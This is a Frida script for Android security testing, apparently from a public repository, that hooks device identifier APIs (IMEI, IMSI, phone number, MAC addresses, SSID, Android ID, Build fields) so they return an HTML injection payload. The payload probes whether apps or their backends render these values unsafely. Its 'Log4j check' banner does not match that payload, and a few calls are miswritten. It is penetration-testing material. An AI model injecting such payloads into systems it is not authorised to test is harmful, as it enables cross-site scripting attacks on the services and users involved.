/* Utilities */

var RANDOM = function() {};

function _randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function _randomHex(len) {
    var hex = '0123456789abcdef';
    var output = '';
    for (var i = 0; i < len; ++i) {
        output += hex.charAt(Math.floor(Math.random() * hex.length));
    }
    return output;
}

function _pad(n, width) {
    n = n + "";
    return n.length >= width ? n : new Array(width - n.length + 1).join("0") + n;
}

function _randomPaddedInt(length) {
    return _pad(_randomInt(0, Math.pow(10, length)), length);
}

function _luhn_getcheck(code) {
    code = String(code).concat("0");
    var len = code.length;
    var parity = len % 2;
    var sum = 0;
    for (var i = len - 1; i >= 0; i--) {
        var d = parseInt(code.charAt(i))
        if (i % 2 == parity) {
            d *= 2;
        }
        if (d > 9) {
            d -= 9;
        }
        sum += d;
    }
    var checksum = sum % 10;
    return checksum == 0 ? 0 : 10 - checksum;
}

function _luhn_verify(code) {
    code = String(code);
    var len = code.length;
    var parity = len % 2;
    var sum = 0;
    for (var i = len - 1; i >= 0; i--) {
        var d = parseInt(code.charAt(i))
        if (i % 2 == parity) {
            d *= 2;
        }
        if (d > 9) {
            d -= 9;
        }
        sum += d;
    }
    return sum % 10 == 0;
}

/* Spoofing functions */


Java.perform(function() {

    console.log('\n-----Log4j check by @Ch0pin-----------------\n');
    console.log('-----https://github.com/Ch0pin/log4JFrida---\n')

    try {
        var networkInterface = Java.use('java.net.NetworkInterface');
        var secureSettings = Java.use('android.provider.Settings$Secure');
        var contentResolver = Java.use('android.content.ContentResolver');
        var wifiInfo = Java.use('android.net.wifi.WifiInfo');
        var bluetoothAdapter = Java.use('android.bluetooth.BluetoothAdapter');
        var mediaDrm = Java.use('android.media.MediaDrm');
        var telephonyManager = Java.use('android.telephony.TelephonyManager');
        var build = Java.use('android.os.Build');
        var systemProperties = Java.use('android.os.SystemProperties');
        var buildProperties = Java.use('android.os.Build');

        //-----------------------------------------------
        buildProperties.MODEL.value = "\"><img/src=x>";
        buildProperties.DEVICE.value = "\"><img/src=x>";
        buildProperties.BOARD.value = "\"><img/src=x>";
        buildProperties.PRODUCT.value = "\"><img/src=x>";
        buildProperties.HARDWARE.value = "\"><img/src=x>";
        buildProperties.FINGERPRINT.value = "\"><img/src=x>"
        buildProperties.MANUFACTURER.value = "\"><img/src=x>";
        buildProperties.BOOTLOADER.value = "\"><img/src=x>";
        buildProperties.BRAND.value = "\"><img/src=x>";
        buildProperties.HOST.value = "\"><img/src=x>";
        buildProperties.ID.value = "\"><img/src=x>";
        buildProperties.DISPLAY.value = "\"><img/src=x>";
        buildProperties.TAGS.value = "\"><img/src=x>";
        buildProperties.SERIAL.value = "\"><img/src=x>";
        buildProperties.TYPE.value = "\"><img/src=x>";
        buildProperties.USER.value = "\"><img/src=x>";
        buildProperties.UNKNOWN.value = "\"><img/src=x>";

        //-----------------------------------------------

        var payl0ad = "\"><img/src=x>";
        var imei_payl0ad = "\"><img/src=x>aa"; // int(15)
        var phone_payl0ad = "\"><img/src=x>"; // int(11)
        var android_id_payl0ad = "\"><img/src=x>aaa"; // str(16)
        var imsi_payl0ad = "\"><img/src=x>aa"; // int(15)
        var mac_address_payl0ad = "\"><img/src=x>aaaa"; // str(17)

        // console.log("Payload: " + payl0ad);


        systemProperties.get.overload('java.lang.String').implementation = function(key) {
            console.log('[+] Get system properties called using key: ' + key + ', returning ' + payl0ad);
            return payl0ad;

        }

        build.getSerial.implementation = function() {
            console('[+] Application is fetching the OS serial, returning ' + payl0ad, {
                c: Color.Green
            });
            return payl0ad;
        }

        telephonyManager.getLine1Number.overloads[0].implementation = function() {
            console('[+] Application is fetching the phone number, returning ' + phone_payl0ad, {
                c: Color.Green
            });
            return payl0ad;
        }

        telephonyManager.getSubscriberId.overload().implementation = function() {
            console.log('[i] Application asks for device IMSI, returning:' + imsi_payl0ad);
            return payl0ad;
        }
        telephonyManager.getSubscriberId.overload('int').implementation = function() {
            console.log('[i] Application asks for device IMSI, returning ' + imsi_payl0ad);
            return payl0ad;
        }

        telephonyManager.getDeviceId.overloads[0].implementation = function() {
            console.log('[i] Application asks for device IMEI, returning' + imei_payl0ad);
            return payl0ad;
        }
        telephonyManager.getDeviceId.overloads[1].implementation = function(slot) {
            console.log('[i] Application asks for device IMEI, returning:' + imei_payl0ad);
            return payl0ad;
        }

        telephonyManager.getImei.overloads[0].implementation = function() {
            console.log('[i] Application asks for device IMEI, returning :' + imei_payl0ad);
            return payl0ad;
        }
        telephonyManager.getImei.overloads[1].implementation = function(slot) {
            console.log('[i] Application asks for device IMEI, returning: ' + imei_payl0ad);
            return payl0ad;
        }

        telephonyManager.getSimOperator.overload().implementation = function() {
            console.log('[+] getSimOperator call detected, returning:' + payl0ad);
            return payl0ad;
        }
        telephonyManager.getSimOperator.overload('int').implementation = function(sm) {
            console.log('[+] getSimOperator call detected, returning:' + payl0ad);
            return payl0ad;
        }


        bluetoothAdapter.getAddress.implementation = function() {
            console.log("[+] Cloaking BT Mac Address, returning:" + mac_address_payl0ad);
            return payl0ad;
        }


        wifiInfo.getMacAddress.implementation = function() {
            console.log("[+] Cloaking wifi Mac Address, returning:" + mac_address_payl0ad);
            return payl0ad;

        }
        wifiInfo.getSSID.implementation = function() {
            console.log("[+] Cloaking SSID, returning:" + payl0ad);
            return payl0ad;

        }
        wifiInfo.getBSSID.implementation = function() {
            console.log("[+] Cloaking Router Mac Address, returning:" + mac_address_payl0ad);
            return payl0ad;

        }


        // contentResolver.query.overload('android.net.Uri', '[Ljava.lang.String;', 'android.os.Bundle', 'android.os.CancellationSignal').implementation = function(uri, str, bundle, sig) {
        //     if (uri == 'content://com.google.android.gsf.gservicesa') {
        //         console.log('[+] Cloaking Google Services Framework Identifier Query, returning null');
        //         return null;
        //     } else
        //         return payl0ad;


        // }

        // contentResolver.query.overload('android.net.Uri', '[Ljava.lang.String;', 'java.lang.String', '[Ljava.lang.String;', 'java.lang.String').implementation = function(uri, astr, bstr, cstr, dstr) {
        //     if (uri == 'content://com.google.android.gsf.gservicesa') {
        //         console.log('[+] Cloaking Google Services Framework Identifier Query, returning null');
        //         return null;
        //     } else
        //         return getApplicationContext.getContentResolver.query(uri, astr, bstr, cstr, dstr);

        // }

        // contentResolver.query.overload('android.net.Uri', '[Ljava.lang.String;', 'java.lang.String', '[Ljava.lang.String;', 'java.lang.String', 'android.os.CancellationSignal').implementation = function(uri, astr, bstr, cstr, sig) {
        //     if (uri == 'content://com.google.android.gsf.gservicesa') {
        //         console.log('[+] Cloaking Google Services Framework Identifier Query, returning null');
        //         return null;
        //     } else
        //         return payl0ad;

        // }

        secureSettings.getString.implementation = function(contentresolver, query) {
            console.log('[+] Cloaking Android ID, returning dummy value:' + android_id_payl0ad);
            if (query == 'android_id')
                return payl0ad;
            else
                return this.getString(contentresolver, query);
        }


        var ni = Java.use("java.net.NetworkInterface");
        ni.getHardwareAddress.overload().implementation = function() {
                return mac_address_payl0ad;
        }

        
    } catch (error) {
        console.log(error)
    }

});
